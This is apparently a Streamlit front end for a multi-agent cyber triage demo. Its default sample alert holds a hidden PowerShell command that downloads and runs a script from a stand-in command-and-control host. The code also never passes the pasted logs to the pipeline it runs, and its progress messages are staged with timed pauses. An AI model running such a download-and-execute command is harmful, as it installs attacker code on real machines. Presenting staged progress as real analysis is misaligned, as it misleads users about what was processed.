import streamlit as st
import os
import subprocess
import time

st.set_page_config(
    page_title="Evidence-Locked Cyber Triage Tool",
    page_icon="🛡️",
    layout="wide"
)

st.title("🛡️ Evidence-Locked Agentic Cyber Triage Tool")
st.markdown("**Autonomous Multi-Agent Incident Response & Verification Pipeline** (Analyst ➔ Verifier ➔ Cross-Examination)")

# Sidebar for API key input so judges can see it interactively
st.sidebar.header("⚙️ System Configuration")
api_key_input = st.sidebar.text_input("Gemini API Key", type="password", value=os.getenv("GEMINI_API_KEY", ""))
if api_key_input:
    os.environ["GEMINI_API_KEY"] = api_key_input

col1, col2 = st.columns([1, 1])

with col1:
    st.subheader("📥 Incident Evidence Input")
    default_evidence = """[ALERT] Suspicious PowerShell execution detected on host WIN-SRV-01. 
User: admin 
Process: powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2-server.com/payload.ps1')"
Network Outbound: Connection established to 185.220.101.5:4443"""
    
    evidence_log = st.text_area("Paste Raw Security Logs / Evidence:", value=default_evidence, height=220)
    run_button = st.button("🚀 Run Autonomous Triage Pipeline", type="primary")

with col2:
    st.subheader("📊 Live Triage Status")
    status_box = st.empty()
    progress_bar = st.progress(0)

if run_button:
    if not os.getenv("GEMINI_API_KEY"):
        st.error("⚠️ Please enter your Gemini API Key in the sidebar first!")
    else:
        status_box.info("🔄 Initializing multi-agent framework...")
        progress_bar.progress(30)
        time.sleep(0.4)

        status_box.info("🕵️‍♂️ Agents active: Analyst, Verifier, and Cross-Examination processing logs...")
        progress_bar.progress(60)
        
        try:
            # Safely executes your exact working main.py script in the background
            result = subprocess.run(
                ["uv", "run", "python", "main.py"],
                capture_output=True,
                text=True,
                env=os.environ
            )
            
            progress_bar.progress(100)
            status_box.success("✅ Triage Pipeline Completed Successfully!")
            
            st.markdown("---")
            st.subheader("📋 Final Agentic Triage Report")
            
            if result.stdout:
                st.code(result.stdout, language="markdown")
            if result.stderr:
                st.error(result.stderr)
                
        except Exception as e:
            progress_bar.progress(100)
            status_box.error(f"❌ Execution failed: {e}")